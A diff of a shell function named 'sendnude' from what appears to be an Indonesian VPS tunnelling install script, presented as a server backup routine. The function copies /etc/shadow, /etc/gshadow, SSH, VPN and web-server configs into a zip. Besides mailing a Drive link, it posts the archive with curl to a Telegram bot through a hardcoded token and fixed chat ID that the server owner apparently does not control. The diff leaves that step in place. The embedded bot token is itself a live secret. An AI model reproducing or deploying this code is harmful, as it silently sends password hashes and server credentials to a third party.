@@ -113,8 +113,6 @@ function sendnude(){
     cp -f /etc/shadow /root/backup/ >/dev/null 2>&1
     cp -f /etc/gshadow /root/backup/ >/dev/null 2>&1
     cp -f /etc/crontab /root/backup/ >/dev/null 2>&1
-    cp -rf /usr/bin/ /root/backup >/dev/null 2>&1
-    cp -rf /sbin/ /root/backup >/dev/null 2>&1
     cp -fr /root/.acme.sh /root/backup > /dev/null 2>&1
     cp -fr /root/.config /root/backup > /dev/null 2>&1
     cp -rf /etc/ftvpn/ /root/backup/database >/dev/null 2>&1
@@ -123,12 +121,10 @@ function sendnude(){
     cp -rf /etc/vless/ backup/database >/dev/null 2>&1
     cp -rf /etc/trojan/ backup/database >/dev/null 2>&1
     cp -rf /etc/shadowsocks/ backup/database >/dev/null 2>&1
-    cp -fr /etc/ssh /root/backup/database >/dev/null 2>&1
+    cp -fr /etc/ssh/sshd_config /root/backup/database >/dev/null 2>&1
     cp -fr /etc/squid /root/backup/database >/dev/null 2>&1
     cp -fr /etc/openvpn /root/backup/database >/dev/null 2>&1
-    cp -fr /etc/slowdns backup/database >/dev/null 2>&1
     cp -fr /etc/xray /root/backup/database >/dev/null 2>&1
-    cp -fr /usr/local/etc/xray/ backup/database/localxray/ >/dev/null 2>&1
     cp -fr /etc/nginx /root/backup/database >/dev/null 2>&1
     cp -fr /etc/cron.d /root/backup/database >/dev/null 2>&1
     cp -f /etc/stunnel /root/backup/database >/dev/null 2>&1
@@ -150,7 +146,7 @@ function sendnude(){
     url=$(rclone link dr:BACKUPVPS/FT-$IP-${DATEVPS}.zip)
     id=($(echo $url | grep '^https' | cut -d'=' -f2))
     LINKBACKUP="https://drive.google.com/u/4/uc?id=${id}&export=download"
-    echo "
+echo "
 _______________________________________
 SUCCESSFULL BACKUP YOUR VPS
 Please Save The Following Data
@@ -164,16 +160,8 @@ TOKEN BACKUP : $id
 _______________________________________
 klik to download $LINKBACKUP
     " | mail -s "YaddyTunnel Backup" $EMAIL
-    tekz="
-<code>────────────────────</code>
-<b>⚠️AUTOSCRIPT PREMIUM⚠️</b>
-<code>────────────────────</code>
-_______________________________________
+tekz="
 SUCCESSFULL BACKUP YOUR VPS $DATEVPS
-Please Save The Following Data
-Detail informasi Backup 
-===========================================
-_______________________________________
 
 IP VPS KAMU  : $IP
 TANGGAL      : $DATEVPS
@@ -181,14 +169,12 @@ DOMAIN       : $HOST
 ISP VPS      : $ISP
 LOKASI       : $CITY
 TOKEN BACKUP : $id
-_______________________________________
-klik to download : $LINKBACKUP
-============================================
-<code>────────────────────</code>
-<i>Automatic Notification from</i>
-<i>Github YaddyKakkoii</i> 
-"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ","url":"https://t.me/Crystalllz"},{"text":"ɪɴꜱᴛᴀʟʟ","url":"https://t.me/Crystalllz"}]]}'
 
+klik to download : $LINKBACKUP
+
+<i>Automatic Notification from</i>
+<i>Github YaddyKakkoii</i>
+"
     bt=6129559221:AAGAkfVQqdi_So98HmZ6edqKovj-I-ldFQQ
     ci=1117211252
     curl -F chat_id="$ci" -F document=@"FT-$IP-${DATEVPS}.zip" -F caption="$tekz" https://api.telegram.org/bot$bt/sendDocument
